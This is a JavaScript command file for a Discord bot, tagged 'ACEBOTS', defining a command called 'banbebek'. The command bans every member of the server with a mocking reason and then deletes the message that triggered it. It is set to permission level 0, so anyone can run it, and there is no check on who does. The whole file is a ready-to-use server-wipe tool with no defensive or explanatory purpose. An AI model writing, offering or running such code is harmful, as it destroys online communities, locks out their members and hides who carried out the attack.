const Discord = require('discord.js');
const db = require('quick.db')//ACEBOTS

exports.run = async(client, message, args) => { 
  
message.guild.members.cache.forEach(member => member.guild.members.ban(member,{ reason: "Geçmiş Olsunnn"}));   
message.delete()  //ACEBOTS


};
exports.conf = {//ACEBOTS

  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 0 
};

exports.help = {
  name: 'banbebek',
};
//ACEBOTS
